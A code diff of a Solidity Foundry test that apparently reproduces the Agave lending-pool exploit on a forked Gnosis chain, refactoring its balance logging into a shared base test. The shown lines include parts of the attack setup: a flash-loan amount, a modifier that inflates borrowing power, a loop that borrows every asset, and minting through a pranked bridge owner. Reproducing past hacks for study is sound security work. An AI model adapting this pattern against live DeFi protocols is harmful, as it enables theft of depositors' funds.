@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
+import "./../basetest.sol";
 import "./../interface.sol";
 
 interface IGnosisBridgedAsset is IERC20 {
@@ -40,7 +40,7 @@ Detailed explanation of the agave exploit attack flow:
 Note: These concise steps outline the specific actions taken in each phase of the agave exploit, providing a clear understanding of the attack flow.
 */
 
-contract AgaveExploit is Test {
+contract AgaveExploit is BaseTestWithBalanceLog {
     //Prepare numbers
     uint256 linkLendNum1 = 1.0000000000000002 ether;
     uint256 wethlendnum2 = 1;
@@ -60,10 +60,7 @@ contract AgaveExploit is Test {
     address usdc = 0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83;
     address wxdai = 0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d;
 
-    // Array of assets with weth at the end
-    address[] assetAddrs;
-    string[] assetNames = ["USDC", "GNO", "LINK", "WBTC", "WXDAI", "WETH", "aWETH"];
-    uint8[] assetDecimals = [6, 18, 18, 8, 18, 18, 18];
+    // Array of assets with weth at the end (uses fundingTokens from BaseTestWithBalanceLog)
 
     address provider = 0xA91B9095eFa6C0568467562032202108e49c9Ef8;
     //Address that can mint tokens on gnosis bridge
@@ -78,12 +75,6 @@ contract AgaveExploit is Test {
 
     uint256 ethFlashloanAmt = 2728.934387414251504146 ether + 1;
 
-    modifier balanceLog() {
-        _logBalances("Before hack balances");
-        _;
-        _logBalances("After hack balances");
-    }
-
     modifier boostLTVHack() {
         lendingPool.deposit(weth, WETH.balanceOf(address(this)) - 1, address(this), 0);
         _;
@@ -97,38 +88,20 @@ contract AgaveExploit is Test {
         return IERC20(asset).balanceOf(address(this));
     }
 
-    function _logBalances(
-        string memory message
-    ) internal {
-        console.log(message);
-        console.log("--- Start of balances ---");
-        
-        for (uint i = 0; i < assetAddrs.length; i++) {
-            emit log_named_decimal_uint(
-                string.concat(assetNames[i], " Balance"), 
-                _getTokenBal(assetAddrs[i]), 
-                assetDecimals[i]
-            );
-        }
-        
-        emit log_named_decimal_uint("healthf", _getHealthFactor(), 18);
-        console.log("--- End of balances ---");
-    }
-
     function setUp() public {
         vm.createSelectFork("gnosis", 21_120_283); //fork gnosis at block number 21120319
         lendingPool = ILendingPool(ILendingPoolAddressesProvider(provider).getLendingPool());
         wethLiqBeforeHack = _getAvailableLiquidity(weth);
 
-        // Initialize asset array
-        assetAddrs = new address[](7);
-        assetAddrs[0] = usdc;
-        assetAddrs[1] = gno;
-        assetAddrs[2] = link;
-        assetAddrs[3] = wbtc;
-        assetAddrs[4] = wxdai;
-        assetAddrs[5] = weth;
-        assetAddrs[6] = aweth;
+        multiAssetLog = true;
+        fundingTokens = new address[](7);
+        fundingTokens[0] = usdc;
+        fundingTokens[1] = gno;
+        fundingTokens[2] = link;
+        fundingTokens[3] = wbtc;
+        fundingTokens[4] = wxdai;
+        fundingTokens[5] = weth;
+        fundingTokens[6] = aweth;
 
         //Lets just mint weth to this contract for initial debt
         vm.startPrank(tokenOwner);
@@ -219,7 +192,7 @@ contract AgaveExploit is Test {
     function borrowTokens() internal boostLTVHack {
         // Borrow all assets except weth (which is at index 5)
         for (uint i = 0; i < 5; i++) {
-            _borrow(assetAddrs[i]);
+            _borrow(fundingTokens[i]);
         }
     }
 
